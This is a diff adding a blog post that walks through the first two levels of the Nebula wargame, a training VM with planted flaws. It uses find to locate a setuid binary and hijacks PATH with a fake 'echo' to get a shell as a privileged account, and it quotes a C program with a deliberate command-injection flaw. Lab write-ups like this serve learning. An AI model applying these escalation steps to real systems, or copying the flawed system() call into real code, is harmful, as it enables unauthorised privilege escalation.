@@ -1,0 +1,112 @@
+---
+layout: post
+title:  "Nebula"
+date:   2021-03-21 00:00:00 +0000
+categories: ExploitEducation
+---
+# Level 00
+## Description
+
+Link [https://exploit.education/nebula/level-00/](https://exploit.education/nebula/level-00/)
+```
+This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.
+
+Alternatively, look at the find man page.
+
+To access this level, log in as level00 with the password of level00.
+```
+
+## Analyse
+1. The first level aims to understand the usage of `find` command:
+```
+       -perm mode
+              File's  permission  bits  are  exactly  mode (octal or symbolic).  Since an exact match is required, if you want to use this form for symbolic modes, you may have to specify a rather complex mode string.  For example
+              -perm g=w will only match files which have mode 0020 (that is, ones for which group write permission is the only permission set).  It is more likely that you will want to use the `/' or `-' forms, for  example  -perm
+              -g=w, which matches any file with group write permission.  See the EXAMPLES section for some illustrative examples.
+
+       -perm -mode
+              All  of  the  permission bits mode are set for the file.  Symbolic modes are accepted in this form, and this is usually the way in which would want to use them.  You must specify `u', `g' or `o' if you use a symbolic
+              mode.   See the EXAMPLES section for some illustrative examples.
+
+       -perm /mode
+              Any of the permission bits mode are set for the file.  Symbolic modes are accepted in this form.  You must specify `u', `g' or `o' if you use a symbolic mode.  See the EXAMPLES section for some illustrative examples.
+              If no permission bits in mode are set, this test matches any file (the idea here is to be consistent with the behaviour of -perm -000).
+       
+       -user uname
+              File is owned by user uname (numeric user ID allowed).
+```
+We can use the `-perm -mode` to find a file matches the given permission. As we need to run as `flag00`, the `setuid` flag should be set, thus the permission should be `4000`. And the user should be `flag00`, which means we need to use `-user user`.
+
+## Solution
+```bash
+level00@nebula:~$ find / -perm -4000 -user flag00 2>/dev/null
+/bin/.../flag00
+/rofs/bin/.../flag00
+level00@nebula:~$ /bin/.../flag00
+Congrats, now run getflag to get your flag!
+flag00@nebula:~$ getflag
+You have successfully executed getflag on a target account
+flag00@nebula:~$ id
+uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)
+```
+
+## After thought
+1. `setuid` flag is critical, as it gives file owner's right to who executes the program. 
+
+## Ref
+ 1.[Permission calculator and explanation](http://permissions-calculator.org/info/)
+
+# Level 01
+## Description
+
+Link [https://exploit.education/nebula/level-01/](https://exploit.education/nebula/level-01/)
+```
+There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
+
+To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.
+```
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  system("/usr/bin/env echo and now what?");
+}
+```
+
+## Analyse
+1. This program is simple, it set the owner's and group's id with `setuid` and `setgid`, then run command `/usr/bin/env echo and now what?` which print the text `and now what?`. Our object is to run `bash` with as user `flag01`.
+   1. The command `/usr/bin/env` means to use the current environments variables which alse contains `PATH`. 
+   2. When we run a command without giving its absolute path, it will serch the available paths in `PATH` variable from left to right, in order to find a executable with the same name as the command. 
+   3. When we modify out `PATH` env variable to our current working directory, and create a executable file naming `echo`, then run the vulnerable program, what will it happen ? il will run our arbitray `echo` as user `flag01` !
+
+
+## Solution
+```bash
+level01@nebula:~$ ls -la echo
+-rwxr-xr-x 1 level01 level01 5 2021-03-21 13:06 echo
+level01@nebula:~$ cat echo
+bash
+level01@nebula:~$ PATH=/home/level01:$PATH ../flag01/flag01 
+flag01@nebula:~$ id
+uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
+flag01@nebula:~$ getflag
+You have successfully executed getflag on a target account
+```
+
+## After thought
+1. In the program, it should always run a command with its absolute path!
+
+## Ref
